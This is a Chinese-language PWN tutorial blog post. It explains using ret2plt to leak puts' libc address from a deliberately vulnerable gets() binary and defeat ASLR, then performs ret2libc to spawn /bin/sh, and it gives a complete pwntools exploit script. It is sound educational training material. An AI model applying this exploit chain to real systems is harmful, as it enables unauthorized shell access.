---
title: ret2plt 绕过 ASLR
subtitle:
date: 2023-08-23T17:21:36+08:00
draft: false
author:
  name: CuB3y0nd
  link:
  email:
  avatar:
description:
keywords:
license:
comment: true
weight: 0
tags:
  - PWN
  - Stack
categories:
  - PWN
hiddenFromHomePage: false
hiddenFromSearch: false
summary:
resources:
  - name: featured-image
    src: featured-image.jpg
  - name: featured-image-preview
    src: featured-image-preview.jpg
toc: true
math: false
lightgallery: false
password:
message:
repost:
  enable: false
  url:
---

绕过 ASLR

<!--more-->

## 0x01 概述

这次没有可以直接利用的信息了，你必须使用前面讲到的 ret2plt 技术。在进一步了解之前，请先自己
尝试一下。

{{< link href="/pwn_assets/ret2plt.zip" content="ret2plt.zip" title="Download ret2plt.zip" download="ret2plt.zip" card=true >}}

```c {title="source.c"}
#include <stdio.h>

void vuln() {
  puts("Come get me");

  char buffer[20];
  gets(buffer);
}

int main() {
  vuln();

  return 0;
}
```

## 0x02 分析

我们需要以某种手段泄漏 ASLR 基地址。在这题中，唯一可行的方法是 ret2plt。`gets()`
可以读取任意大小的数据，所以不用担心栈空间不足的问题。我们可以充分利用 `gets()`
构造 ret2plt 的 exploit 链。通过返回到 PLT 表，可以泄漏需要的地址信息。

因此，在栈空间充足的情况下，使用 ret2plt 是最合适的手段。

## 0x03 利用

基本信息：

```python
from pwn import *

context.log_level = 'debug'

elf = context.binary = ELF('./vuln-32')
libc = elf.libc

p = process()
```

现在我们要构造一个可以泄漏 `puts` 真实地址的 payload。根据之前讲到的，调用函数的
PLT 条目等同于调用函数本身。传入 `puts@got` 作为参数，会打印出 `puts` 在 `libc` 中的
实际地址，因为 C 语言传递字符串参数传递的是指针。我们知道 `puts@got` 就是一个已知
地址，可以打印。这样就可以通过 `puts@plt` 间接获取 `puts@got` 中的内容。

```python
p.recvline()  # 只接收第一个输出

payload = flat(
    'A' * 32,
    elf.plt['puts'],
    elf.sym['main'],
    elf.got['puts']
)
```

调用 `main` 的目的是让程序可以重新运行。如果我们直接返回到一个随机的地址，会让
程序崩溃。再次调用 `main` 本质上是重启了程序，这样可以使程序在泄漏 `libc` 的基地址
后继续运行。然后我们就可以进行 ret2libc 攻击。

```python
p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)
```

这里需要注意 `puts` 会一直输出，直到遇到空字节，所以它不只是泄漏了 GOT 表中的地址。
但我们只关心第一个，也就是 GOT 表里面的前 4 个字节。使用 `u32` 转换为地址。之后，
忽略调用 `main` 时产生的其它内容。我们只取关键信息，过滤无用数据。

从这里开始，我们只需要计算出 `libc` 的基地址并执行基本的 ret2libc：

```python
libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
    'A' * 32,
    libc.sym['system'],
    libc.sym['exit'],  # 虽然这里不需要退出，但这样做更好
    next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```

### 1x01 最终 Exploit

```python {title="exp.py"}
from pwn import *

context.log_level = 'debug'

elf = context.binary = ELF('./vuln-32')
libc = elf.libc

p = process()

p.recvline()  # 只接收第一个输出

payload = flat(
    'A' * 32,
    elf.plt['puts'],
    elf.sym['main'],
    elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
    'A' * 32,
    libc.sym['system'],
    libc.sym['exit'],  # 虽然这里不需要退出，但这样做会更好
    next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```

## 0x04 64-bit

你知道该怎么做 :) 在 64-bit 上尝试同样的操作。如果需要，你可以使用 pwntools 的 ROP 功能；
或者，为了确保你理解调用约定，请大胆地同时执行这两个操作 :P

{{< link href="/pwn_assets/ret2plt-64.zip" content="ret2plt-64.zip" title="Download ret2plt-64.zip" download="ret2plt-64.zip" card=true >}}

